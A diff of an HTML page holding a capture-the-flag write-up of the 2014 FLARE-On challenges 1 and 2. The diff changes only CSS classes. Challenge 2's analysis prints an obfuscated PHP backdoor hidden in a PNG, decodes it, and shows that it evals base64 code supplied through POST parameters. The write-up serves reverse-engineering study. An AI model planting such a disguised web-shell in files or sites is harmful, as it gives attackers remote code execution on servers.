@@ -27,13 +27,13 @@
         <p style="float:right;">🔖 tagged <a href=/tags.html#ctf>ctf</a></p>
     <div style="clear:both;"></div>
     <hr><h2 class="h2 collapsible" onclick="toggle(this);">Introduction</h2>
-<p class="nested">FireEye has been putting up CTF styled malware and forensics challenges for last two years, named <a href="http://www.flare-on.com/">FLARE On</a>. I recently attempted few of those challenges from the 2014 set and will document steps to complete them.</p>
-<p class="nested">The challenge files are available under the <a href="http://www.flare-on.com/PastResults/2014/Downloads">PastResults/2014/Downloads</a> directory on the site. If you are into malware analysis and have worked with publicly available samples earlier, you can easily guess the password. If not consider this archive to be a challenge and try breaking the password scheme for it :)</p>
-<p class="nested">Once you get hold of the challenge files, you will find that there are total seven of them. This writeup documents the steps involved in solving challenges 1-5 and 6-7 have been left out for another post. Let's get started with the writeup now.</p>
+<p class="nested active">FireEye has been putting up CTF styled malware and forensics challenges for last two years, named <a href="http://www.flare-on.com/">FLARE On</a>. I recently attempted few of those challenges from the 2014 set and will document steps to complete them.</p>
+<p class="nested active">The challenge files are available under the <a href="http://www.flare-on.com/PastResults/2014/Downloads">PastResults/2014/Downloads</a> directory on the site. If you are into malware analysis and have worked with publicly available samples earlier, you can easily guess the password. If not consider this archive to be a challenge and try breaking the password scheme for it :)</p>
+<p class="nested active">Once you get hold of the challenge files, you will find that there are total seven of them. This writeup documents the steps involved in solving challenges 1-5 and 6-7 have been left out for another post. Let's get started with the writeup now.</p>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Challenges</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Challenge #1</h3>
-<p class="nested">The first challenge seems to be a PE file but let's do the initial reconnaissance to gather more details:</p>
-<pre class="nested"><code>$ file C1.exe
+<p class="nested active">The first challenge seems to be a PE file but let's do the initial reconnaissance to gather more details:</p>
+<pre class="nested active"><code>$ file C1.exe
 C1.exe: PE32+ executable (GUI) x86-64, for MS Windows
 $
 $ file -i C1.exe
@@ -95,23 +95,23 @@ PBY CLICKING ON THE &quot;ACCEPT&quot; BUTTON, YOU OR THE ENTITY THAT YOU REPRES
 PPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPAD
 $
 </code></pre>
-<p class="nested">So, the usual stuff. It is a PE file for x64 architecture. Nothing out of the ordinary here. However, upon executing this file inside a VM I found that it shows an EULA from FireEye and once you agree with terms of the license it drops a file named <code>Challenge1.exe</code>:</p>
-<pre class="nested"><code>$ file Challenge1.exe
+<p class="nested active">So, the usual stuff. It is a PE file for x64 architecture. Nothing out of the ordinary here. However, upon executing this file inside a VM I found that it shows an EULA from FireEye and once you agree with terms of the license it drops a file named <code>Challenge1.exe</code>:</p>
+<pre class="nested active"><code>$ file Challenge1.exe
 Challenge1.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
 $
 </code></pre>
-<p class="nested">So the first challenge is a <code>.Net</code> file. Let's try executing it:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c1-1.png.webp" /></p>
-<p class="nested">The file shows a window with <code>Form1</code> as its title, a funny image with a message <code>Let's start with something easy!</code> and a huge <code>DECODE!</code> button. Upon clicking the button, image turns awkward and message changes to some cryptic text:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c1-2.png.webp" /></p>
-<p class="nested">I opened this file with <a href="http://ilspy.net/">ILSpy</a> and found the <code>Form1</code> object with an interesting method called <code>btnDecode_Click</code>:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c1-ilspy-btndecode.png.webp" /></p>
-<p class="nested">This method is the callback for the <code>OnClick</code> eventhandler of the <code>DECODE!</code> button we saw on the UI. Interestingly it has some loops that mangle bits and update the message with the resulting encoded text. The source message is loaded from a resource object called <code>dat_secret</code>. You can save this object as a binary blob to a local file for further analysis:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c1-ilspy-datsecret-save.png.webp" /></p>
-<p class="nested">Upon loading this binary blob, the first loop in the file performs some byte shifting and xor operations on it:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c1-ilspy-deobfuscate.png.webp" /></p>
-<p class="nested">Let's quickly reverse these operations before proceeding further:</p>
-<pre class="nested"><code class="language-python">$ file rev_challenge_1.dat_secret.encode
+<p class="nested active">So the first challenge is a <code>.Net</code> file. Let's try executing it:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c1-1.png.webp" /></p>
+<p class="nested active">The file shows a window with <code>Form1</code> as its title, a funny image with a message <code>Let's start with something easy!</code> and a huge <code>DECODE!</code> button. Upon clicking the button, image turns awkward and message changes to some cryptic text:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c1-2.png.webp" /></p>
+<p class="nested active">I opened this file with <a href="http://ilspy.net/">ILSpy</a> and found the <code>Form1</code> object with an interesting method called <code>btnDecode_Click</code>:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c1-ilspy-btndecode.png.webp" /></p>
+<p class="nested active">This method is the callback for the <code>OnClick</code> eventhandler of the <code>DECODE!</code> button we saw on the UI. Interestingly it has some loops that mangle bits and update the message with the resulting encoded text. The source message is loaded from a resource object called <code>dat_secret</code>. You can save this object as a binary blob to a local file for further analysis:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c1-ilspy-datsecret-save.png.webp" /></p>
+<p class="nested active">Upon loading this binary blob, the first loop in the file performs some byte shifting and xor operations on it:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c1-ilspy-deobfuscate.png.webp" /></p>
+<p class="nested active">Let's quickly reverse these operations before proceeding further:</p>
+<pre class="nested active"><code class="language-python">$ file rev_challenge_1.dat_secret.encode
 rev_challenge_1.dat_secret.encode: data
 $
 $ wc -c rev_challenge_1.dat_secret.encode
@@ -130,10 +130,10 @@ $ ipython
 '3rmahg3rd.b0b.d0ge@flare-on.com'
 &gt;&gt;&gt;
 </code></pre>
-<p class="nested">Alright, so the binary blob is of size 31B and has seemingly uninteresting data. On repeating the bit operations we get an email and this completes the challenge for us.</p>
+<p class="nested active">Alright, so the binary blob is of size 31B and has seemingly uninteresting data. On repeating the bit operations we get an email and this completes the challenge for us.</p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Challenge #2</h3>
-<p class="nested">This challenge has two files: a HTML and PNG respectively. From the very start of this challenge I was keen on analyzing the PNG as somewhere in the back of my mind I had this intuition that it could be a stegano challenge. As such I tried gathering more information about the PNG file:</p>
-<pre class="nested"><code>$ file home.html
+<p class="nested active">This challenge has two files: a HTML and PNG respectively. From the very start of this challenge I was keen on analyzing the PNG as somewhere in the back of my mind I had this intuition that it could be a stegano challenge. As such I tried gathering more information about the PNG file:</p>
+<pre class="nested active"><code>$ file home.html
 home.html: HTML document, UTF-8 Unicode text, with very long lines, with CRLF line terminators
 $
 $ file img/flare-on.png
@@ -166,10 +166,10 @@ Software                        : Adobe ImageReady
 Image Size                      : 400x79
 $
 </code></pre>
-<p class="nested">Honestly, this output depressed me a bit as there was nothing particularly interesting here. But before delving into analyzing the HTML, I decided to view the image once:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c2-1.png.webp" /></p>
-<p class="nested">Ah! This left me no choice but to open the HTML and analyze the source, something I was reluctant to do. Anyways, I viewed the source and here's a snippet of interesting stuff:</p>
-<pre class="nested"><code class="language-html">&lt;!DOCTYPE html&gt;
+<p class="nested active">Honestly, this output depressed me a bit as there was nothing particularly interesting here. But before delving into analyzing the HTML, I decided to view the image once:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c2-1.png.webp" /></p>
+<p class="nested active">Ah! This left me no choice but to open the HTML and analyze the source, something I was reluctant to do. Anyways, I viewed the source and here's a snippet of interesting stuff:</p>
+<pre class="nested active"><code class="language-html">&lt;!DOCTYPE html&gt;
 &lt;html&gt;
 &lt;head&gt;
     &lt;meta charset=&quot;utf-8&quot;&gt;
@@ -193,10 +193,10 @@ $
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
-<p class="nested">Take note of the <code>php include</code> near bottom of the page. The PNG image is being loaded as a PHP script. This is highly deceptive and immediately reassures my initial belief that the PNG indeed has something interesting in it. I decided to open the PNG in a text editor:</p>
-<p class="nested"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c2-2.png.webp" /></p>
-<p class="nested">Alright, so the PNG file has a PHP script appended to it. Let's extract and analyze this script separately:</p>
-<pre class="nested"><code class="language-php">&lt;?php $terms=array(&quot;M&quot;, &quot;Z&quot;, &quot;]&quot;, &quot;p&quot;, &quot;\\&quot;, &quot;w&quot;, &quot;f&quot;, &quot;1&quot;, &quot;v&quot;, &quot;&lt;&quot;, &quot;a&quot;, &quot;Q&quot;, &quot;z&quot;, &quot; &quot;, &quot;s&quot;, &quot;m&quot;, &quot;+&quot;, &quot;E&quot;, &quot;D&quot;, &quot;g&quot;, &quot;W&quot;, &quot;\&quot;&quot;, &quot;q&quot;, &quot;y&quot;, &quot;T&quot;, &quot;V&quot;, &quot;n&quot;, &quot;S&quot;, &quot;X&quot;, &quot;)&quot;, &quot;9&quot;, &quot;C&quot;, &quot;P&quot;, &quot;r&quot;, &quot;&amp;&quot;, &quot;\'&quot;, &quot;!&quot;, &quot;x&quot;, &quot;G&quot;, &quot;:&quot;, &quot;2&quot;, &quot;~&quot;, &quot;O&quot;, &quot;h&quot;, &quot;u&quot;, &quot;U&quot;, &quot;@&quot;, &quot;;&quot;, &quot;H&quot;, &quot;3&quot;, &quot;F&quot;, &quot;6&quot;, &quot;b&quot;, &quot;L&quot;, &quot;&gt;&quot;, &quot;^&quot;, &quot;,&quot;, &quot;.&quot;, &quot;l&quot;, &quot;$&quot;, &quot;d&quot;, &quot;`&quot;, &quot;%&quot;, &quot;N&quot;, &quot;*&quot;, &quot;[&quot;, &quot;0&quot;, &quot;}&quot;, &quot;J&quot;, &quot;-&quot;, &quot;5&quot;, &quot;_&quot;, &quot;A&quot;, &quot;=&quot;, &quot;{&quot;, &quot;k&quot;, &quot;o&quot;, &quot;7&quot;, &quot;#&quot;, &quot;i&quot;, &quot;I&quot;, &quot;Y&quot;, &quot;(&quot;, &quot;j&quot;, &quot;/&quot;, &quot;?&quot;, &quot;K&quot;, &quot;c&quot;, &quot;B&quot;, &quot;t&quot;, &quot;R&quot;, &quot;4&quot;, &quot;8&quot;, &quot;e&quot;, &quot;|&quot;);
+<p class="nested active">Take note of the <code>php include</code> near bottom of the page. The PNG image is being loaded as a PHP script. This is highly deceptive and immediately reassures my initial belief that the PNG indeed has something interesting in it. I decided to open the PNG in a text editor:</p>
+<p class="nested active"><img alt="image" src="/static/files/posts_flareon2014_15/flareon2014-c2-2.png.webp" /></p>
+<p class="nested active">Alright, so the PNG file has a PHP script appended to it. Let's extract and analyze this script separately:</p>
+<pre class="nested active"><code class="language-php">&lt;?php $terms=array(&quot;M&quot;, &quot;Z&quot;, &quot;]&quot;, &quot;p&quot;, &quot;\\&quot;, &quot;w&quot;, &quot;f&quot;, &quot;1&quot;, &quot;v&quot;, &quot;&lt;&quot;, &quot;a&quot;, &quot;Q&quot;, &quot;z&quot;, &quot; &quot;, &quot;s&quot;, &quot;m&quot;, &quot;+&quot;, &quot;E&quot;, &quot;D&quot;, &quot;g&quot;, &quot;W&quot;, &quot;\&quot;&quot;, &quot;q&quot;, &quot;y&quot;, &quot;T&quot;, &quot;V&quot;, &quot;n&quot;, &quot;S&quot;, &quot;X&quot;, &quot;)&quot;, &quot;9&quot;, &quot;C&quot;, &quot;P&quot;, &quot;r&quot;, &quot;&amp;&quot;, &quot;\'&quot;, &quot;!&quot;, &quot;x&quot;, &quot;G&quot;, &quot;:&quot;, &quot;2&quot;, &quot;~&quot;, &quot;O&quot;, &quot;h&quot;, &quot;u&quot;, &quot;U&quot;, &quot;@&quot;, &quot;;&quot;, &quot;H&quot;, &quot;3&quot;, &quot;F&quot;, &quot;6&quot;, &quot;b&quot;, &quot;L&quot;, &quot;&gt;&quot;, &quot;^&quot;, &quot;,&quot;, &quot;.&quot;, &quot;l&quot;, &quot;$&quot;, &quot;d&quot;, &quot;`&quot;, &quot;%&quot;, &quot;N&quot;, &quot;*&quot;, &quot;[&quot;, &quot;0&quot;, &quot;}&quot;, &quot;J&quot;, &quot;-&quot;, &quot;5&quot;, &quot;_&quot;, &quot;A&quot;, &quot;=&quot;, &quot;{&quot;, &quot;k&quot;, &quot;o&quot;, &quot;7&quot;, &quot;#&quot;, &quot;i&quot;, &quot;I&quot;, &quot;Y&quot;, &quot;(&quot;, &quot;j&quot;, &quot;/&quot;, &quot;?&quot;, &quot;K&quot;, &quot;c&quot;, &quot;B&quot;, &quot;t&quot;, &quot;R&quot;, &quot;4&quot;, &quot;8&quot;, &quot;e&quot;, &quot;|&quot;);
 $order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);
 $do_me=&quot;&quot;;
 for($i=0;$i&lt;count($order);$i++){
@@ -204,8 +204,8 @@ for($i=0;$i&lt;count($order);$i++){
 }
 eval($do_me); ?&gt;
 </code></pre>
-<p class="nested">The first thing I did was to port the PHP code to Python and here's the result:</p>
-<pre class="nested"><code class="language-python">$ ipython
+<p class="nested active">The first thing I did was to port the PHP code to Python and here's the result:</p>
+<pre class="nested active"><code class="language-python">$ ipython
 &gt;&gt;&gt; terms = [&quot;M&quot;, &quot;Z&quot;, &quot;]&quot;, &quot;p&quot;, &quot;\\&quot;, &quot;w&quot;, &quot;f&quot;, &quot;1&quot;, &quot;v&quot;, &quot;&lt;&quot;, &quot;a&quot;, &quot;Q&quot;, &quot;z&quot;, &quot; &quot;, &quot;s&quot;, &quot;m&quot;, &quot;+&quot;, &quot;E&quot;, &quot;D&quot;, &quot;g&quot;, &quot;W&quot;, &quot;\&quot;&quot;, &quot;q&quot;, &quot;y&quot;, &quot;T&quot;, &quot;V&quot;, &quot;n&quot;, &quot;S&quot;, &quot;X&quot;, &quot;)&quot;, &quot;9&quot;, &quot;C&quot;, &quot;P&quot;, &quot;r&quot;, &quot;&amp;&quot;, &quot;\'&quot;, &quot;!&quot;, &quot;x&quot;, &quot;G&quot;, &quot;:&quot;, &quot;2&quot;, &quot;~&quot;, &quot;O&quot;, &quot;h&quot;, &quot;u&quot;, &quot;U&quot;, &quot;@&quot;, &quot;;&quot;, &quot;H&quot;, &quot;3&quot;, &quot;F&quot;, &quot;6&quot;, &quot;b&quot;, &quot;L&quot;, &quot;&gt;&quot;, &quot;^&quot;, &quot;,&quot;, &quot;.&quot;, &quot;l&quot;, &quot;$&quot;, &quot;d&quot;, &quot;`&quot;, &quot;%&quot;, &quot;N&quot;, &quot;*&quot;, &quot;[&quot;, &quot;0&quot;, &quot;}&quot;, &quot;J&quot;, &quot;-&quot;, &quot;5&quot;, &quot;_&quot;, &quot;A&quot;, &quot;=&quot;, &quot;{&quot;, &quot;k&quot;, &quot;o&quot;, &quot;7&quot;, &quot;#&quot;, &quot;i&quot;, &quot;I&quot;, &quot;Y&quot;, &quot;(&quot;, &quot;j&quot;, &quot;/&quot;, &quot;?&quot;, &quot;K&quot;, &quot;c&quot;, &quot;B&quot;, &quot;t&quot;, &quot;R&quot;, &quot;4&quot;, &quot;8&quot;, &quot;e&quot;, &quot;|&quot;]
 &gt;&gt;&gt;
 &gt;&gt;&gt; order = [59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47]
@@ -218,20 +218,20 @@ eval($do_me); ?&gt;
 $_= 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9';$__='JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;;eval($___($__));
 &gt;&gt;&gt;
 </code></pre>
-<p class="nested">Let's do the <code>eval</code> manually. The <code>$__</code> variable is referenced first and it looks like to be base64 encoded. Let's decode it:</p>
-<pre class="nested"><code>$ echo -en &quot;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&quot; | base64 -d -
+<p class="nested active">Let's do the <code>eval</code> manually. The <code>$__</code> variable is referenced first and it looks like to be base64 encoded. Let's decode it:</p>
+<pre class="nested active"><code>$ echo -en &quot;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&quot; | base64 -d -
 $code=base64_decode($_);eval($code);
 $
 </code></pre>
-<p class="nested">So, this code will base64 decode the <code>$_</code> variable and that's what we need to do next:</p>
-<pre class="nested"><code>$ echo -en &quot;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9&quot; | base64 -d -
+<p class="nested active">So, this code will base64 decode the <code>$_</code> variable and that's what we need to do next:</p>
+<pre class="nested active"><code>$ echo -en &quot;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9&quot; | base64 -d -
 if(isset($_POST[&quot;\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D&quot;])) {
  eval(base64_decode($_POST[&quot;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&quot;]));
 }
 $
 </code></pre>
-<p class="nested">So the decoding results in more PHP code that will <code>eval</code> the base64 decoded version of string: <code>\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D</code>. This string is weird as it contains hex, octal and seemingly octal bytes. Look carefully at the bytes: <code>\97\49\x31\68</code>. Although preceded by a backslash <code>97</code>, <code>49</code> and <code>68</code> are not octal bytes. It seems like another layer of obfuscation where decimal bytes are preceded with slashes to confuse the parser. Thanks to <a href="http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html">this</a> writeup from <a href="https://twitter.com/bbaskin">@bbaskin</a> we can easily decode this encoded blob and get the flag:</p>
-<pre class="nested"><code class="language-python">$ ipython
+<p class="nested active">So the decoding results in more PHP code that will <code>eval</code> the base64 decoded version of string: <code>\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D</code>. This string is weird as it contains hex, octal and seemingly octal bytes. Look carefully at the bytes: <code>\97\49\x31\68</code>. Although preceded by a backslash <code>97</code>, <code>49</code> and <code>68</code> are not octal bytes. It seems like another layer of obfuscation where decimal bytes are preceded with slashes to confuse the parser. Thanks to <a href="http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html">this</a> writeup from <a href="https://twitter.com/bbaskin">@bbaskin</a> we can easily decode this encoded blob and get the flag:</p>
+<pre class="nested active"><code class="language-python">$ ipython
 &gt;&gt;&gt;
 &gt;&gt;&gt; c = r&quot;\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D&quot;
 &gt;&gt;&gt; result = &quot;&quot;
@@ -250,8 +250,8 @@ a11.that.java5crap@flare-on.com
 &gt;&gt;&gt;
 </code></pre>
 <h3 class="h3 collapsible" onclick="toggle(this);">Challenge #3</h3>
